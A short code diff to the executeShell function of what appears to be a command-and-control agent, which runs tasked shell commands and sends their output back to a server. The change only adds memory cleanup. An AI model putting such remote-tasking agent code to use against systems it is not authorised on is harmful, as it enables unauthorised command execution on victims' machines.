@@ -23,6 +23,13 @@ BOOL executeShell(PParser arguments)
 	if (!fp)
 	{
 		_err("[SHELL] Error in executeShell command");
+
+		// Cleanup memory
+		freePackage(output);
+		freePackage(responseTask);
+		LocalFree(cmd);
+		LocalFree(taskUuid);
+
 		return FALSE;
 	}
 	while (fgets(path, sizeof(path), fp) != nullptr)
@@ -34,8 +41,10 @@ BOOL executeShell(PParser arguments)
 
 	_pclose(fp);
 
-	// Free temporary output again
+	// Cleanup memory
 	freePackage(output);
+	LocalFree(cmd);
+	LocalFree(taskUuid);
 
 	Parser* ResponseParser = sendPackage(responseTask);
 	freeParser(ResponseParser);
